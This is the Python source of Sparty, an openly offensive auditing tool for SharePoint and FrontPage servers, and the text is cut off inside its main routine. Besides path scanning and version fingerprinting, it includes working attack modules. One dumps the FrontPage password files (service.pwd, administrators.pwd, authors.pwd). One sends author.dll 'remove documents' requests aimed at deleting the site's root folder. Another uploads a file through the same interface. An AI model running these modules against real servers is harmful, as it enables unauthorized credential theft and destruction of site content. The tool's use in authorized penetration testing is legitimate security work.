#!/usr/bin/env python2
# coding: utf-8
# Original code: Aditya K Sood - SecNiche Security Labs (c) 2013
# Updated/Bugfixes by: Glenn 'devalias' Grant - http://devalias.net/
# Refactorisation by: Borja R - https://www.libcrack.so/

import os
import re
import sys
import logging
import urllib2
import httplib
import requests
import optparse
from ntlm import HTTPNtlmAuthHandler

logname = "sparty"
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(logname)

# Frontend (bin) repository files

front_bin = [
    '_vti_inf.html',
    '_vti_bin/shtml.dll/_vti_rpc',
    '_vti_bin/owssvr.dll',
    '_vti_bin/_vti_adm/admin.dll',
    '_vti_bin/_vti_adm/admin.exe',
    '_vti_bin/_vti_aut/author.exe',
    '_vti_bin/_vti_aut/WS_FTP.log',
    '_vti_bin/_vti_aut/ws_ftp.log',
    '_vti_bin/shtml.exe/_vti_rpc',
    '_vti_bin/_vti_aut/author.dll']

front_services = [
    '_vti_bin/Admin.asmx',
    '_vti_bin/alerts.asmx',
    '_vti_bin/dspsts.asmx',
    '_vti_bin/forms.asmx',
    '_vti_bin/Lists.asmx',
    '_vti_bin/people.asmx',
    '_vti_bin/Permissions.asmx',
    '_vti_bin/search.asmx',
    '_vti_bin/UserGroup.asmx',
    '_vti_bin/versions.asmx',
    '_vti_bin/Views.asmx',
    '_vti_bin/webpartpages.asmx',
    '_vti_bin/webs.asmx',
    '_vti_bin/spsdisco.aspx',
    '_vti_bin/AreaService.asmx',
    '_vti_bin/BusinessDataCatalog.asmx',
    '_vti_bin/ExcelService.asmx',
    '_vti_bin/SharepointEmailWS.asmx',
    '_vti_bin/spscrawl.asmx',
    '_vti_bin/spsearch.asmx',
    '_vti_bin/UserProfileService.asmx',
    '_vti_bin/WebPartPages.asmx']

# Frontend (pvt) repository files

front_pvt = [
    '_vti_pvt/authors.pwd',
    '_vti_pvt/administrators.pwd',
    '_vti_pvt/users.pwd',
    '_vti_pvt/service.pwd',
    '_vti_pvt/service.grp',
    '_vti_pvt/bots.cnf',
    '_vti_pvt/service.cnf',
    '_vti_pvt/access.cnf',
    '_vti_pvt/writeto.cnf',
    '_vti_pvt/botsinf.cnf',
    '_vti_pvt/doctodep.btr',
    '_vti_pvt/deptodoc.btr',
    '_vti_pvt/linkinfo.cnf',
    '_vti_pvt/services.org',
    '_vti_pvt/structure.cnf',
    '_vti_pvt/svcacl.cnf',
    '_vti_pvt/uniqperm.cnf',
    '_vti_pvt/service/lck',
    '_vti_pvt/frontpg.lck']

# Sharepoint and Frontend (directory) repository

directory_check = [
    '_vti_pvt/',
    '_vti_bin/',
    '_vti_log/',
    '_vti_cnf/',
    '_vti_bot',
    '_vti_bin/_vti_adm',
    '_vti_bin/_vti_aut',
    '_vti_txt/']

# Sharepoint repository files

sharepoint_check_layout = [
    '_layouts/aclinv.aspx',
    '_layouts/addrole.aspx',
    '_layouts/AdminRecycleBin.aspx',
    '_layouts/AreaNavigationSettings.aspx',
    '_Layouts/AreaTemplateSettings.aspx',
    '_Layouts/AreaWelcomePage.aspx',
    '_layouts/associatedgroups.aspx',
    '_layouts/bpcf.aspx',
    '_Layouts/ChangeSiteMasterPage.aspx',
    '_layouts/create.aspx',
    '_layouts/editgrp.aspx',
    '_layouts/editprms.aspx',
    '_layouts/groups.aspx',
    '_layouts/help.aspx',
    '_layouts/images/',
    '_layouts/listedit.aspx',
    '_layouts/ManageFeatures.aspx',
    '_layouts/ManageFeatures.aspx',
    '_layouts/mcontent.aspx',
    '_layouts/mngctype.aspx',
    '_layouts/mngfield.aspx',
    '_layouts/mngsiteadmin.aspx',
    '_layouts/mngsubwebs.aspx',
    '_layouts/mngsubwebs.aspx?view=sites',
    '_layouts/mobile/mbllists.aspx',
    '_layouts/MyInfo.aspx',
    '_layouts/MyPage.aspx',
    '_layouts/MyTasks.aspx',
    '_layouts/navoptions.aspx',
    '_layouts/NewDwp.aspx',
    '_layouts/newgrp.aspx',
    '_layouts/newsbweb.aspx',
    '_layouts/PageSettings.aspx',
    '_layouts/people.aspx',
    '_layouts/people.aspx?MembershipGroupId=0',
    '_layouts/permsetup.aspx',
    '_layouts/picker.aspx',
    '_layouts/policy.aspx',
    '_layouts/policyconfig.aspx',
    '_layouts/policycts.aspx',
    '_layouts/Policylist.aspx',
    '_layouts/prjsetng.aspx',
    '_layouts/quiklnch.aspx',
    '_layouts/recyclebin.aspx',
    '_Layouts/RedirectPage.aspx',
    '_layouts/role.aspx',
    '_layouts/settings.aspx',
    '_layouts/SiteDirectorySettings.aspx',
    '_layouts/sitemanager.aspx',
    '_layouts/SiteManager.aspx?lro=all',
    '_layouts/spcf.aspx',
    '_layouts/storman.aspx',
    '_layouts/themeweb.aspx',
    '_layouts/topnav.aspx',
    '_layouts/user.aspx',
    '_layouts/userdisp.aspx',
    '_layouts/userdisp.aspx?ID=1',
    '_layouts/useredit.aspx',
    '_layouts/useredit.aspx?ID=1',
    '_layouts/viewgrouppermissions.aspx',
    '_layouts/viewlsts.aspx',
    '_layouts/vsubwebs.aspx',
    '_layouts/WPPrevw.aspx?ID=247',
    '_layouts/wrkmng.aspx']

sharepoint_check_forms = [
    'Forms/DispForm.aspx',
    'Forms/DispForm.aspx?ID=1',
    'Forms/EditForm.aspx',
    'Forms/EditForm.aspx?ID=1',
    'Forms/Forms/AllItems.aspx',
    'Forms/MyItems.aspx',
    'Forms/NewForm.aspx',
    'Pages/default.aspx',
    'Pages/Forms/AllItems.aspx']

sharepoint_check_catalog = [
    '_catalogs/masterpage/Forms/AllItems.aspx',
    '_catalogs/wp/Forms/AllItems.aspx',
    '_catalogs/wt/Forms/Common.aspx']

password_files = [
    '_vti_pvt/service.pwd',
    '_vti_pvt/administrators.pwd',
    '_vti_pvt/authors.pwd']

refine_target = []
pvt_target = []
dir_target = []
sharepoint_target_layout = []
sharepoint_target_forms = []
sharepoint_target_catalog = []


def check_python():
    """
    Checks if the script is being run using python v3
    """
    version = sys.version_info
    if version[:2][0] == 3:
        logger.error("Python3 not supported")
        sys.exit(1)


def banner():
    print("\t---------------------------------------------------------------")
    sparty_banner = """
          _|_|_|    _|_|_|     _|_|    _|_|_|    _|_|_|_|_|  _|      _|
         _|        _|    _|  _|    _|  _|    _|      _|        _|  _|
           _|_|    _|_|_|    _|_|_|_|  _|_|_|        _|          _|
               _|  _|        _|    _|  _|    _|      _|          _|
         _|_|_|    _|        _|    _|  _|    _|      _|          _|

        SPARTY : Sharepoint/Frontpage Security Auditing Tool
        Authored by: Aditya K Sood | {0kn0ck}@secniche.org | @AdityaKSood | 2013
        Updated by: Borja R | borja@libcrack.so | @borjiviri | 2015
        Powered by: SecNiche Security Labs | 2013
        Backed by:  Pentest Limited | 2015
        """
    print(sparty_banner)
    print("\t--------------------------------------------------------------")


def usage(destination):
    """
    Usage information
    """
    print(
        "[scanning access permissions in forms directory - sharepoint] %s -s forms -u  %s " %
        (sys.argv[0], destination))
    print(
        "[scanning access permissions in frontpage directory - frontpage] %s -f pvt -u %s " %
        (sys.argv[0], destination))
    print("[dumping passwords] %s -d dump -u %s " % (sys.argv[0], destination))
    print("[note] : please take this into consideration")
    print("\t\t: (1) always specify https | http explicitly")
    print("\t\t: (2) always provide the proper directory structure where sharepoint/frontpage is installed")
    print("\t\t: (3) do not specify '/' at the end of url")


def build_target(target, front_dirs=[], refine_target=[]):
    """
    Build target for scanning frontpage and sharepoint files
    """
    for item in front_dirs:
        refine_target.append(target + "/" + item)


def success(module_name):
    """
    Display success notification
    """
    logger.info("\n[+] check for HTTP codes (200) for active list of accessible files or directories (404) - Not exists | (403) - Forbidden (500) - Server Error")
    logger.info("\n[+] (%s) - module executed successfully\n" % module_name)


def target_information(url):
    """
    Extract information about target's enviornment
    """
    logger.info(
        "[+] fetching information from the given target : (%s)" %
        (url))
    try:
        r = requests.get(url)
        logger.info(
            "[+] target responded with HTTP code: (%s)" %
            r.status_code)
        logger.info("[+] target is running server: (%s)" % r.headers["server"])

    except urllib2.HTTPError as h:
        logger.info("[-] url error occured - (%s)" % h.code)
        pass


def audit(target=[]):
    """
    Scan for common frontpage/sharepoint files
    """
    for element in target:
        try:
            handle = urllib2.urlopen(element)
            info = handle.info()
            response_code = handle.getcode()
            logger.info("[+] (%s) - (%d)" % (element, response_code))

        except urllib2.HTTPError as h:
            logger.info("[-] (%s) - (%d)" % (element, h.code))

        except httplib.BadStatusLine:
            logger.info("[-] server responds with bad status")
            pass


def dump_credentials(dest):
    """
    Dump frontpage service and administrators password files if present
    """
    password_targets = []

    for item in password_files:
        password_targets.append(dest + "/" + item)

    for entry in password_targets:
        try:
            handle = urllib2.urlopen(entry)
            if handle.getcode() == 200:
                logger.info(
                    "[+] dumping contents of file located at : (%s)" %
                    (entry))
                filename = "__dump__.txt"
                dump = open(filename, 'a')
                dump.write(handle.read())
            logger.info(handle.read())

        except urllib2.HTTPError as h:
            logger.info(
                "[-] could not dump the file located at : (%s) | (%d)" %
                (entry, h.code))
            continue

        except httplib.BadStatusLine:
            logger.info("[-] server responds with bad status")
            continue

        logger.info(
            "[*] ---------------------------------------------------------------------------------------")
    logger.info("[+] check the (%s) file if generated\n" % (filename))


def fingerprint_frontpage(name):
    """
    Fingerprint frontpage version using default files
    """
    enum_nix = [
        '_vti_bin/_vti_aut/author.exe',
        '_vti_bin/_vti_adm/admin.exe',
        '_vti_bin/shtml.exe']
    enum_win = [
        '_vti_bin/_vti_aut/author.dll',
        '_vti_bin/_vti_aut/dvwssr.dll',
        '_vti_bin/_vti_adm/admin.dll',
        '_vti_bin/shtml.dll']
    build_enum_nix = []
    build_enum_win = []

    for item in enum_nix:
        build_enum_nix.append(name + "/" + item)

    for entry in build_enum_nix:
        try:
            info = urllib2.urlopen(entry)
            if info.getcode() == 200:
                logger.info(
                    "[+] front page is tested as : nix version |  (%s) | (%d)" %
                    (entry, info.getcode()))

        except urllib2.HTTPError:
            pass

    for item in enum_win:
        build_enum_win.append(name + "/" + item)

    for entry in build_enum_win:
        try:
            info = urllib2.urlopen(entry)
            if info.getcode() == 200:
                logger.info(
                    "[+] front page is tested as : windows version |  (%s) | (%d)" %
                    (entry, info.getcode()))

        except urllib2.HTTPError:
            logger.info(
                "[-] failed to extract the version of frontpage from default file!")
            pass

        except httplib.BadStatusLine:
            logger.info("[-] server responds with bad status")
            pass

    frontend_version = name + "/_vti_inf.html"
    try:
        version = urllib2.urlopen(frontend_version)
        logger.info(
            "[+] extracting frontpage version from default file : (%s):" %
            re.findall(
                r'FPVersion=(.*)',
                version.read()))

    except urllib2.HTTPError:
        logger.error(
            "[-] failed to extract the version of frontpage from default file")
        pass

    except httplib.BadStatusLine:
        logger.error("[-] server responds with bad status")
        pass

    logger.info(
        "[*] ---------------------------------------------------------------------------------------")

# dump sharepoint headers for version fingerprinting


def dump_sharepoint_headers(name):
    """
    dump sharepoint headers for version fingerprint
    """
    try:
        dump_s = urllib2.urlopen(name)
        logger.info(
            "[+] configured sharepoint version is  : (%s)" %
            dump_s.info()['microsoftsharepointteamservices'])
    except KeyError:
        logger.error(
            "[-] sharepoint version could not be extracted using HTTP header :  MicrosoftSharepointTeamServices")

    try:
        dump_f = urllib2.urlopen(name)
        logger.info(
            "[+] sharepoint is configured with load balancing capability : (%s)" %
            dump_f.info()['x-sharepointhealthscore'])

    except KeyError:
        logger.error(
            "[-] sharepoint load balancing ability could not be determined using HTTP header : X-SharepointHealthScore")

    try:
        dump_g = urllib2.urlopen(name)
        logger.info(
            "[+] sharepoint is configured with explicit diagnosis (GUID based log analysis) purposes : (%s)" %
            dump_f.info()['sprequestguid'])

    except KeyError:
        logger.error(
            "[-] sharepoint diagnostics ability could not be determined using HTTP header : SPRequestGuid")

    except urllib2.HTTPError:
        pass

    except httplib.BadStatusLine:
        logger.error("[-] server responds with bad status")
        pass


# file uploading routine to upload file remotely on frontpage extensions

def frontpage_rpc_check(name):
    headers = {
        'MIME-Version': '4.0',
        'User-Agent': 'MSFrontPage/4.0',
        'X-Vermeer-Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'Keep-Alive'}

    exp_target_list = [
        '_vti_bin/shtml.exe/_vti_rpc',
        '_vti_bin/shtml.dll/_vti_rpc']
    data = "method= server version"
    # data="method=list+services:4.0.2.0000&service_name="
    # for item in exploit_targets:

    for item in exp_target_list:
        destination = name + "/" + item

    logger.info(
        "[+] Sending HTTP GET request to - (%s) for verifying whether RPC is listening" %
        destination)
    try:
        req = urllib2.Request(destination)
        response = urllib2.urlopen(req)
        if response.getcode() == 200:
            logger.info(
                "[+] target is listening on frontpage RPC - (%s)\n" %
                response.getcode())
        else:
            logger.info(
                "[-] target is not listening on frontpage RPC - (%s)\n" %
                response.getcode())

    except urllib2.URLError as e:
        logger.error("[-] url error, code: %s" % e.code)
        pass

    except httplib.BadStatusLine as h:
        logger.error("[-] server responds with bad status")
        pass

    logger.info(
        "[+] Sending HTTP POST request to retrieve software version - (%s)" %
        destination)
    try:
        req = urllib2.Request(destination, data, headers)
        response = urllib2.urlopen(req)
        if response.getcode() == 200:
            logger.info(
                "[+] target accepts the request - (%s) | (%s)\n" %
                (data, response.getcode()))
            filename = "__version__.txt" + ".html"
            version = open(filename, 'a')
            version.write(response.read())
            logger.info("[+] check file for contents - (%s) \n" % filename)
        else:
            logger.info(
                "[-] target fails to accept request - (%s) | (%s)\n" %
                (data, response.getcode()))

    except urllib2.URLError as e:
        logger.error(
            "[-] url error, seems like authentication is required or server failed to handle request - %s" %
            e.code)
        pass

    except httplib.BadStatusLine:
        logger.error("[-] server responds with bad status")
        pass

    logger.info(
        "[*] ---------------------------------------------------------------------------------------")


def frontpage_service_listing(name):
    headers = {
        'MIME-Version': '4.0',
        'User-Agent': 'MSFrontPage/4.0',
        'X-Vermeer-Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'Keep-Alive'}

    service_target_list = [
        '_vti_bin/shtml.exe/_vti_rpc',
        '_vti_bin/shtml.dll/_vti_rpc']
    data = [
        'method=list+services:3.0.2.1076&service_name=',
        'method=list+services:4.0.2.471&service_name=',
        'method=list+services:4.0.2.0000&service_name=',
        'method=list+services:5.0.2.4803&service_name=',
        'method=list+services:5.0.2.2623&service_name=',
        'method=list+services:6.0.2.5420&service_name=']

    for item in service_target_list:
        destination = name + "/" + item

    logger.info(
        "[+] Sending HTTP POST request to retrieve service listing  - (%s)" %
        destination)
    try:
        for entry in data:
            req = urllib2.Request(destination, entry, headers)
            response = urllib2.urlopen(req)
            if response.getcode() == 200:
                logger.info(
                    "[+] target accepts the request - (%s) | (%s)" %
                    (entry, response.getcode()))
                filename = "__service-list__.txt" + entry + ".html"
                service_list = open(filename, 'a')
                service_list.write(response.read())
                logger.info("[+] check file for contents - (%s) \n" % filename)
            else:
                logger.info(
                    "[-] target fails to accept request - (%s) | (%s)\n" %
                    (data, response.getcode()))

    except urllib2.URLError as e:
        logger.error(
            "[-] url error, seems like authentication is required or server failed to handle request - %s" %
            e.code)
        pass

    except httplib.BadStatusLine:
        logger.error("[-] server responds with bad status")
        pass

    logger.info(
        "[*] ---------------------------------------------------------------------------------------")


def frontpage_config_check(name):
    headers = {
        'MIME-Version': '4.0',
        'User-Agent': 'MSFrontPage/4.0',
        'X-Vermeer-Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'Keep-Alive'}

    # running some standard commands to retrieve files and configuration checks
    # frontpage versions validated are: 3.0.2.1706 , 4.0.2.4715 , 5.0.2.4803, 5.0.2.2623 , 6.0.2.5420
    # version : major ver=n.minor ver=n.phase ver=n.verincr=v

    front_exp_target = '_vti_bin/_vti_aut/author.dll'
    payloads = [
        'method=open service:3.0.2.1706&service_name=/',
        'method=list documents:3.0.2.1706&service_name=&listHiddenDocs=false&listExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl=',
        'method=getdocument:3.0.2.1105&service_name=&document_name=about/default.htm&old_theme_html=false&force=true&get_option=none&doc_version=',
        'method=open service:4.0.2.4715&service_name=/',
        'method=list documents:4.0.2.4715&service_name=&listHiddenDocs=false&listExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl=',
        'method=getdocument:4.0.2.4715&service_name=&document_name=about/default.htm&old_theme_html=false&force=true&get_option=none&doc_version=',
        'method=open service:5.0.2.4803&service_name=/',
        'method=list documents:5.0.2.4803&service_name=&listHiddenDocs=false&listExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl=',
        'method=getdocument:5.0.2.4803&service_name=&document_name=about/default.htm&old_theme_html=false&force=true&get_option=none&doc_version=',
        'method=open service:5.0.2.2623&service_name=/',
        'method=list documents:5.0.2.2623&service_name=&listHiddenDocs=false&listExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl=',
        'method=getdocument:5.0.2.2623&service_name=&document_name=about/default.htm&old_theme_html=false&force=true&get_option=none&doc_version=',
        'method=open service:6.0.2.5420&service_name=/',
        'method=list documents:6.0.2.5420&service_name=&listHiddenDocs=false&listExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl=',
        'method=getdocument:6.0.2.5420&service_name=&document_name=about/default.htm&old_theme_html=false&force=true&get_option=none&doc_version=']

    for item in payloads:
        destination = name + "/" + front_exp_target
        logger.info(
            "[+] Sending HTTP POST request to [open service | listing documents] - (%s)" %
            destination)
        try:
            req = urllib2.Request(destination, item, headers)
            response = urllib2.urlopen(req)
            if response.getcode() == 200:
                logger.info(
                    "[+] target accepts the request - (%s) | (%s)\n" %
                    (item, response.getcode()))
                filename = "__author-dll-config__.txt" + ".html"
                service_list = open(filename, 'a')
                service_list.write(response.read())
                logger.info("[+] check file for contents - (%s) \n" % filename)

            else:
                logger.info(
                    "[-] target fails to accept request - (%s) | (%s)\n" %
                    (item, response.getcode()))

        except urllib2.URLError as e:
            logger.error(
                "[-] url error, seems like authentication is required or server failed to handle request - %s \n[-] payload [%s]\n" %
                (e.code, item))
            pass

        except httplib.BadStatusLine:
            logger.error("[-] server responds with bad status")
            pass


def frontpage_remove_folder(name):
    """
    Remove specific folder from the web server
    """
    headers = {
        'MIME-Version': '4.0',
        'User-Agent': 'MSFrontPage/4.0',
        'X-Vermeer-Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'Keep-Alive'}

    # running some standard commands to remove "/" folder from the web server using author.dll
    # frontpage versions validated are: 3.0.2.1706 , 4.0.2.4715 , 5.0.2.4803,
    # 5.0.2.2623 , 6.0.2.5420

    file_exp_target = '_vti_bin/_vti_aut/author.dll'
    payloads = [
        'method=remove+documents:3.0.2.1786&service_name=/',
        'method=remove+documents:4.0.2.4715&service_name=/',
        'method=remove+documents:5.0.3.4803&service_name=/',
        'method=remove+documents:5.0.2.4803&service_name=/',
        'method=remove+documents:6.0.2.5420&service_name=/']

    for item in payloads:
        destination = name + "/" + file_exp_target
        logger.info(
            "[+] Sending HTTP POST request to remove '/' directory to - (%s)" %
            destination)
        try:
            req = urllib2.Request(destination, item, headers)
            response = urllib2.urlopen(req)
            if response.getcode() == 200:
                logger.info(
                    "[+] folder removed successfully - (%s) | (%s)\n" %
                    (item, response.getcode()))
                for line in response.readlines():
                    logger.info(line)
            else:
                logger.error(
                    "[-] fails to remove '/' folder at  - (%s) | (%s)\n" %
                    (item, response.getcode()))

        except urllib2.URLError as e:
            logger.error(
                "[-] url error, seems like authentication is required or server failed to handle request - %s \n[-] payload [%s]\n" %
                (e.code, item))
            pass

        except httplib.BadStatusLine:
            logger.error("[-] server responds with bad status")
            pass


# file uploading through author.dll

def file_upload_check(name):
    headers = {
        'MIME-Version': '4.0',
        'User-Agent': 'MSFrontPage/4.0',
        'X-Vermeer-Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'Keep-Alive'}

    # running some standard commands to upload file to  web server using author.dll
    # frontpage versions validated are: 3.0.2.1706 , 4.0.2.4715 , 5.0.2.4803,
    # 5.0.2.2623 , 6.0.2.5420

    os.system("echo 'Sparty Testing' > sparty.txt")
    file_exp_target = '_vti_bin/_vti_aut/author.dll'

    payloads = [
        'method=put document:3.0.2.1706&service_name=&document=[document_name=sparty.txt ; meta_info=[]]&put_option=overwrite&comment=&keep_checked_out=false',
        'method=put document:4.0.2.4715&service_name=&document=[document_name=sparty.txt ; meta_info=[]]&put_option=overwrite&comment=&keep_checked_out=false',
        'method=put document:5.0.2.2623&service_name=&document=[document_name=sparty.txt ; meta_info=[]]&put_option=overwrite&comment=&keep_checked_out=false',
        'method=put document:5.0.2.4823&service_name=&document=[document_name=sparty.txt ; meta_info=[]]&put_option=overwrite&comment=&keep_checked_out=false',
        'method=put document:6.0.2.5420&service_name=&document=[document_name=sparty.txt ; meta_info=[]]&put_option=overwrite&comment=&keep_checked_out=false']

    for item in payloads:
        destination = name + "/" + file_exp_target
        logger.info(
            "[+] Sending HTTP POST request for uploading file to - (%s)" %
            destination)
        try:
            req = urllib2.Request(destination, item, headers)
            response = urllib2.urlopen(req)
            if response.getcode() == 200:
                logger.info(
                    "[+] file uploaded successfully - (%s) | (%s)\n" %
                    (item, response.getcode()))
                for line in response.readlines():
                    logger.info(line)
            else:
                logger.error(
                    "[-] file fails to upload at  - (%s) | (%s)\n" %
                    (item, response.getcode()))

        except urllib2.URLError as e:
            logger.error(
                "[-] url error, seems like authentication is required or server failed to handle request - %s \n[-] payload [%s]\n" %
                (e.code, item))
            pass

        except httplib.BadStatusLine:
            logger.error("[-] server responds with bad status")
            pass


def enable_ntlm_authentication(user="", password="", url=""):
    """
    NTLM Authentication routine (implemented by devalias.net)
    """
    logger.info("[+][devalias.net] Enabling NTLM authentication support")

    try:
        from urlparse import urlparse, urlunparse
    except ImportError:
        logger.error(
            "[-][devalias.net][NTLM Authentication] Program could not find module : urlparse")
        sys.exit(2)

    if user == "":
        user = raw_input("[+][devalias.net][NTLM Authentication] Enter username (DOMAIN\username): ")
    if password == "":
        password = raw_input(
            "[+][devalias.net][NTLM Authentication] Enter password: ")

    parsed_url = urlparse(url)
    base_uri = urlunparse((parsed_url[0], parsed_url[1], "", "", "", ""))

    passman = urllib2.HTTPPasswordMgrWithDefaultRealm()
    passman.add_password(None, base_uri, user, password)
    # create the NTLM authentication handler
    auth_NTLM = HTTPNtlmAuthHandler.HTTPNtlmAuthHandler(passman)

    # other authentication handlers
    auth_basic = urllib2.HTTPBasicAuthHandler(passman)
    auth_digest = urllib2.HTTPDigestAuthHandler(passman)

    # disable proxies (if you want to stay within the corporate network)
    # proxy_handler = urllib2.ProxyHandler({})
    proxy_handler = urllib2.ProxyHandler()

    # create and install the opener
    opener = urllib2.build_opener(
        proxy_handler,
        auth_NTLM,
        auth_digest,
        auth_basic)
    urllib2.install_opener(opener)

    logger.info(
        "[+][devalias.net][NTLM authentication] Credentials enabled for " +
        user)


def main():
    """
    Main routine
    """
    check_python()
    banner()

    parser = optparse.OptionParser(
        usage="usage: %prog [options]",
        version="%prog 1.0")

    front_page = optparse.OptionGroup(parser, "Frontpage:")
    share_point = optparse.OptionGroup(parser, "Sharepoint:")
    mandatory = optparse.OptionGroup(parser, "Mandatory:")
    exploit = optparse.OptionGroup(
        parser,
        "Information Gathering and Exploit:")
    authentication = optparse.OptionGroup(
        parser,
        "Authentication [devalias.net]")
    general = optparse.OptionGroup(parser, "General:")

    mandatory.add_option(
        "-u",
        "--url",
        type="string",
        help="target url to scan with proper structure",
        dest="url")

    front_page.add_option(
        "-f",
        "--frontpage",
        type="choice",
        choices=[
            'pvt',
            'bin'],
        help="<FRONTPAGE = pvt | bin> -- to check access permissions on frontpage standard files in vti or bin directory",
        dest="frontpage")

    share_point.add_option(
        "-s",
        "--sharepoint",
        type="choice",
        choices=[
            'forms',
            'layouts',
            'catalog'],
        help="<SHAREPOINT = forms | layouts | catalog> -- to check access permissions on sharepoint standard files in forms or layouts or catalog directory",
        dest="sharepoint")

    exploit.add_option(
        "-v",
        "--http_fingerprint",
        type="choice",
        choices=[
            'ms_sharepoint',
            'ms_frontpage'],
        help="<FINGERPRINT = ms_sharepoint | ms_frontpage> -- fingerprint sharepoint or frontpage based on HTTP headers",
        dest="fingerprint")

    exploit.add_option(
        "-d",
        "--dump",
        type="choice",
        choices=[
            'dump',
            'extract'],
        help="<DUMP = dump | extract> -- dump credentials from default sharepoint and frontpage files (configuration errors and exposed entries)",
        dest="dump")
    exploit.add_option(
        "-l",
        "--list",
        type="choice",
        choices=[
            'list',
            'index'],
        help="<DIRECTORY = list | index> -- check directory listing and permissions",
        dest="directory")

    exploit.add_option(
        "-e",
        "--exploit",
        type="choice",
        choices=[
            'rpc_version_check',
            'rpc_service_listing',
            'author_config_check',
            'rpc_file_upload',
            'author_remove_folder'],
        help="EXPLOIT = <rpc_version_check | rpc_service_listing | rpc_file_upload | author_config_check | author_remove_folder> -- exploit vulnerable installations by checking RPC querying, service listing and file uploading",
        dest="exploit")

    exploit.add_option(
        "-i",
        "--services",
        type="choice",
        choices=['serv',
                 'services'],
        help="SERVICES = <serv | services> -- checking exposed services",
        dest="services")

    authentication.add_option(
        "-a",
        "--auth-type",
        type="choice",
        choices=['ntlm'],
        help="AUTHENTICATION = <ntlm> -- Authenticate with NTLM user/pass",
        dest="authentication")

    general.add_option(
        "-x",
        "--examples",
        type="string",
        help="running usage examples",
        dest="examples")

    parser.add_option_group(front_page)
    parser.add_option_group(share_point)
    parser.add_option_group(mandatory)
    parser.add_option_group(exploit)
    parser.add_option_group(authentication)
    parser.add_option_group(general)

    options, arguments = parser.parse_args()

    try:
        target = options.url

        # devalias.net - Authentication
        if options.authentication == "ntlm":
            enable_ntlm_authentication(
                "",
                "",
                target)  # Leave user/pass blank to prompt user
            # TODO: Enable commandline user/pass?

        if target is not None:
            target_information(target)
        else:
            logger.info("[-] specify the options. use (-h) for more help")
            sys.exit(0)

        if options.loglevel:
            logger.setLevel(options.loglevel)
        else:
            logger.setLevel(logging.DEBUG)

        if options.dump == "dump" or options.dump == "extract":
            logger.info(
                "\n[+]------------------------------------------------------------------------------------------------")
            logger.info(
                "[+] dumping (service.pwd | authors.pwd | administrators.pwd | ws_ftp.log) files if possible")
            logger.info(
                "[+]--------------------------------------------------------------------------------------------------\n")
            dump_credentials(target)
            success("password dumping")
            return

        elif options.exploit == "rpc_version_check":
            logger.info(
                "\n[+]-----------------------------------------------------------------------")
            logger.info(
                "[+] auditing frontpage RPC service                                          ")
            logger.info(
                "[+]-------------------------------------------------------------------------\n")
            frontpage_rpc_check(target)
            success("module RPC version check")
            return

        elif options.exploit == "rpc_service_listing":
            logger.info(
                "\n[+]-----------------------------------------------------------------------")
            logger.info(
                "[+] auditing frontpage RPC service for fetching listing                     ")
            logger.info(
                "[+]-------------------------------------------------------------------------\n")
            frontpage_service_listing(target)
            success("module RPC service listing check")
            return

        elif options.exploit == "author_config_check":
            logger.info(
                "\n[+]-----------------------------------------------------------------------")
            logger.info(
                "[+] auditing frontpage configuration settings                               ")
            logger.info(
                "[+]-------------------------------------------------------------------------\n")
            frontpage_config_check(target)
            success("module RPC check")
            return

        elif options.exploit == "author_remove_folder":
            logger.info(
                "\n[+]-----------------------------------------------------------------------")
            logger.info(
                "[+] trying to remove folder from web server                                 ")
            logger.info(
                "[+]-------------------------------------------------------------------------\n")
            frontpage_remove_folder(target)
            success("module remove folder check")
            return

        elif options.exploit == "rpc_file_upload":
            logger.info(
                "\n[+]-----------------------------------------------------------------------")
            logger.info(
                "[+] auditing file uploading misconfiguration                                ")
            logger.info(
                "[+]-------------------------------------------------------------------------\n")
            file_upload_check(target)
            success("module file upload check")
            return

        elif options.examples == "examples":
            usage(target)
            return

        elif options.directory == "list" or options.directory == "index":
            build_target(target, directory_check, dir_target)
            logger.info(
                "\n[+]-----------------------------------------------------------------------")
            logger.info(
                "[+] auditing frontpage directory permissions (forbidden | index | not exist)")
            logger.info(
                "[+]-------------------------------------------------------------------------\n")
            audit(dir_target)
            success("directory check")
            return

        elif options.frontpage == "bin":
            build_target(target, front_bin, refine_target)
            logger.info("\n[+]----------------------------------------")
            logger.info("[+] auditing frontpage '/_vti_bin/' directory")
            logger.info("[+]------------------------------------------\n")
            audit(refine_target)
            success("bin file access")

        elif options.frontpage == "pvt":
            build_target(target, front_pvt, pvt_target)
            logger.info(
                "\n[+]---------------------------------------------------------")
            logger.info(
                "[+] auditing '/_vti_pvt/' directory for sensitive information ")
            logger.info(
                "[+]-----------------------------------------------------------\n")
            audit(pvt_target)
            success("pvt file access")
            return

        elif options.fingerprint == "ms_sharepoint":
            dump_sharepoint_headers(target)
            logger.info("\n[+] sharepoint fingerprint module completed\n")
            return

        elif options.fingerprint == "ms_frontpage":
            fingerprint_frontpage(target)
            logger.info("\n[+] frontpage fingerprint module completed\n")
            return

        elif options.sharepoint == "layouts":
            build_target(
                target,
                sharepoint_check_layout,
                sharepoint_target_layout)
            logger.info(
                "\n[+]-----------------------------------------------------------------")
            logger.info(
                "[+] auditing sharepoint '/_layouts/' directory for access permissions ")
            logger.info(
                "[+]-------------------------------------------------------------------\n")
            audit(sharepoint_target_layout)
            success("layout file access")
            return

        elif options.sharepoint == "forms":
            build_target(
                target,
                sharepoint_check_forms,
                sharepoint_target_forms)
            logger.info(
                "\n[+]--------------------------------------------------------------")
            logger.info(
                "[+] auditing sharepoint '/forms/' directory for access permissions ")
            logger.info(
                "[+]----------------------------------------------------------------\n")
            audit(sharepoint_target_forms)
            success("forms file access")
            return

        elif options.sharepoint == "catalog":
            build_target(
                target,
                sharepoint_check_catalog,
